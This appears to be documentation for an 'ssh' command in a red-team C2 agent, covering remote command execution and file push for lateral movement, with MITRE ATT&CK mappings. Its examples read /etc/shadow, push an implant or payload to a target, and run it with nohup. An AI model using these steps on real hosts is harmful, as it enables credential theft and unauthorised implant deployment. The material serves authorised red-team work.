+++
title = "ssh"
chapter = false
weight = 114
hidden = false
+++

## Summary

Execute commands or push files to remote hosts via SSH. Cross-platform lateral movement and tool transfer.

Two actions:
- **exec** (default): Execute a command on the remote host and return output.
- **push**: Transfer a local file from the agent to the remote host via SSH session (lateral tool transfer T1570).

Supports three authentication methods:
- **Password authentication** (including keyboard-interactive fallback)
- **Key file** — read SSH private key from agent's filesystem
- **Inline key data** — pass PEM-encoded private key directly

## Arguments

| Argument | Required | Type | Default | Description |
|----------|----------|------|---------|-------------|
| action | No | choose_one | exec | `exec` (execute command) or `push` (transfer file) |
| host | Yes | string | | Target host IP or hostname |
| username | Yes | string | | SSH username |
| command | Conditional | string | | Command to execute (required for exec action) |
| password | No | string | | Password for SSH auth (also used as key passphrase) |
| key_path | No | string | | Path to SSH private key on agent filesystem |
| key_data | No | string | | Inline SSH private key in PEM format |
| source | Conditional | string | | Local file path on agent (required for push action) |
| destination | Conditional | string | | Remote file path to write to (required for push action) |
| port | No | number | 22 | SSH port |
| timeout | No | number | 60 | Connection and command timeout in seconds |

At least one authentication method must be provided (`password`, `key_path`, or `key_data`).

## Usage

### Execute Commands (exec action)

**Password authentication:**
```
ssh -host 192.168.1.100 -username root -password toor -command "whoami"
```

**Key file authentication:**
```
ssh -host 192.168.1.100 -username setup -key_path /home/user/.ssh/id_rsa -command "hostname && id"
```

**Key file with passphrase:**
```
ssh -host 192.168.1.100 -username admin -key_path /root/.ssh/id_ed25519 -password keypass -command "cat /etc/shadow"
```

**Inline key data:**
```
ssh -host 192.168.1.100 -username root -key_data "-----BEGIN OPENSSH PRIVATE KEY-----\n..." -command "uname -a"
```

### Push Files (push action)

**Push a payload to a remote Linux host:**
```
ssh -action push -host 192.168.1.100 -username root -password toor -source /tmp/payload -destination /tmp/payload
```

**Push with key auth:**
```
ssh -action push -host 10.0.0.5 -username deploy -key_path /root/.ssh/id_rsa -source /opt/tools/implant -destination /home/deploy/implant
```

**Typical lateral movement workflow:**
```
# 1. Push payload to target
ssh -action push -host 192.168.1.100 -username root -password pass -source /tmp/fawkes -destination /tmp/fawkes

# 2. Execute payload on target
ssh -host 192.168.1.100 -username root -password pass -command "nohup /tmp/fawkes &"
```

## Notes

- **Push action**: Transfers file content through the SSH session stdin pipe (`cat > destination`). The file is automatically set to mode 755 (executable). Verifies byte count on the remote side.
- Authentication methods are tried in order: key auth first (if provided), then password, then keyboard-interactive
- Host key verification is disabled (standard for red team tooling)
- Combined stdout and stderr output is returned
- Uses pure Go `golang.org/x/crypto/ssh` library — no external SSH binary or SFTP needed
- Works cross-platform: can SSH from Windows, Linux, or macOS agents

## MITRE ATT&CK Mapping

- **T1021.004** — Remote Services: SSH
- **T1570** — Lateral Tool Transfer (push action)
